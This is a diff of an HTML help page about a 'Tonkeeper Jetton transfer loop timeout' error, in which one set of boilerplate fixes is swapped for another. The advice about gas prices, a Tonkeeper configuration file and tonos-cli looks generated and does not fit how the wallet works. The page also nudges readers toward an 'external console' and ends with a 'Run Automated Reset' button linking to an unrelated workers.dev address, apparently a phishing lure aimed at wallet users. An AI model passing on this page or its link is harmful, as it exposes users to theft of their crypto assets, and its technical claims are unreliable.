@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #121214;
+        font-family: -apple-system;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -41,30 +41,34 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons, resulting in failed transactions and a poor user experience.</li>
+<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons, resulting in failed transactions and uncertainty about the status of their assets.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a timeout in the Tonkeeper jetton transfer loop, which can be caused by network congestion, high gas prices, or issues with the Tonkeeper smart contract.</li>
+<li>The error occurs due to a mismatch between the expected and actual transaction processing times, leading to a timeout in the Tonkeeper system. This discrepancy can be caused by network congestion, high transaction volumes, or issues with the Tonkeeper node synchronization.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the timeout threshold: Adjust the configuration to allow for longer transaction processing times.</li>
-<li>Optimize gas prices: Lower gas prices can help reduce network congestion and decrease the likelihood of timeouts.</li>
-<li>Update Tonkeeper contract: Ensure the Tonkeeper smart contract is up-to-date, as newer versions may include fixes for known issues.</li>
+<li>Adjust the transaction timeout parameter to a higher value to accommodate slower processing times:</li>
+<li>Increase the timeout threshold using the <code>tonos-cli</code> command</li>
+<li>Verify the current network congestion and transaction queue length</li>
+<li>Update the Tonkeeper configuration file with the new timeout value, as shown in the following code block:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">20</span>
+<span class="w">  </span><span class="nt">&quot;node&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;url&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://main.ton.dev&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;sync&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
+<span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console to troubleshoot and execute commands for more complex issues. </p>
+<p>Consider utilizing an external console for more advanced debugging and configuration adjustments. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Familiarity with TON blockchain and Tonkeeper ecosystem</li>
-<li>Access to the Tonkeeper smart contract configuration</li>
-<li>Basic understanding of JSON configuration files</li>
+<li>Tonos-cli installed and configured on the system</li>
+<li>Basic understanding of TON blockchain and Tonkeeper functionality</li>
+<li>Access to the Tonkeeper configuration files and settings</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
